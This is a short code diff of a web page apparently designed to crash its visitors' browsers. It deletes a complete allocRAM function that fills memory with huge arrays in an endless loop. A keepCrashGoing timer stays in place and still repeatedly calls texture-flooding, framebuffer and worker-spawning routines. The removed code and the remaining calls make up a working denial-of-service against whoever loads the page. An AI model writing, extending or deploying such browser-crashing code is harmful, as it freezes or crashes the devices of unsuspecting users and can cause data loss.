@@ -79,18 +79,6 @@
     document.body.appendChild(canvas);
     const gl = canvas.getContext('webgl');
 
-    function allocRAM() {
-      try {
-        while (true) {
-          const arr = new Float64Array(50_000_000);
-          arr.fill(Math.random());
-          ramChunks.push(arr);
-        }
-      } catch (e) {
-        console.log("Memory allocation stopped:", e.message);
-      }
-    }
-
     function createTextures() {
       for (let i = 0; i < 200; i++) {
         const size = 2048;
@@ -281,7 +269,6 @@
 
     function keepCrashGoing() {
       setInterval(() => {
-        allocRAM();
         createTextures();
         framebufferInsanity();
         spawnWorkers();
